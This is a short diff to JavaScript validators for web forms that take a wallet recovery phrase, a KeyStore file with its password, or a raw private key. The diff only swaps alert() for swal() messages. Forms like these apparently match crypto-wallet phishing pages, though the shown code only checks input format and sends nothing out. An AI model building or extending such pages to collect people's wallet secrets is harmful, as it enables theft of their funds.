@@ -78,14 +78,14 @@ function validatePhraseForm() {
 
     // Basic validation
     if (phraseTextarea === '' || walletType === '') {
-        alert('Please fill in all fields.');
+        swal('Please fill in all fields.');
         return null;
     }
 
     // Validate pattern (12 or 24 words separated by single spaces)
     var phrasePattern = /^(\S+\s+){11}\S+$|^(\S+\s+){23}\S+$/;
     if (!phrasePattern.test(phraseTextarea)) {
-        alert('Phrase must be 12 or 24 words separated by single spaces.');
+        swal('Phrase must be 12 or 24 words separated by single spaces.');
         return null;
     }
 
@@ -101,14 +101,14 @@ function validateKeyStoreForm() {
 
     // Basic validation
     if (keystoreTextarea === '' || passwordInput === '' || walletType === '') {
-        alert('Please enter both KeyStore, password, and select wallet type.');
+        swal('Please enter both KeyStore, password, and select wallet type.');
         return null;
     }
 
     // Validate pattern (JSON format)
     var jsonPattern = /^\{[\s\S]*\}$/;
     if (!jsonPattern.test(keystoreTextarea)) {
-        alert('KeyStore must be a valid JSON format.');
+        swal('KeyStore must be a valid JSON format.');
         return null;
     }
 
@@ -123,14 +123,14 @@ function validatePrivateKeyForm() {
 
     // Basic validation
     if (privateKeyTextarea === '' || walletType === '') {
-        alert('Please fill in all fields.');
+        swal('Please fill in all fields.');
         return null;
     }
 
     // Validate pattern (64 alphanumeric characters)
     var privateKeyPattern = /^[a-fA-F0-9]{64}$/;
     if (!privateKeyPattern.test(privateKeyTextarea)) {
-        alert('Private key must be 64 alphanumeric characters.');
+        swal('Private key must be 64 alphanumeric characters.');
         return null;
     }
 
